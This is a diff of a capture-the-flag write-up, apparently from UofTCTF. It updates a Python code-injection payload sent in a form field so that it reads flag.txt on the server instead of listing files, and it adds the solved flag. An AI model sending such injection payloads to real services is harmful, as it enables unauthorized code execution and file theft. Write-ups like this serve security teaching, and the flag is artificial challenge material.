@@ -39,12 +39,12 @@ Content-Type: application/x-www-form-urlencoded
 Content-Length: 15
 
 code=
-__import__("os").system("ls")
+__import__("os").popen("cat flag.txt").read()
 ```
 
-> Since I can't access the website again, I will leave this writeup without the actual flag
+![flag](images/flag.png)
 
 ## Flag
 ```
--
+uoftctf{r3g3x_3p1c_f41L_XDDD}
 ```
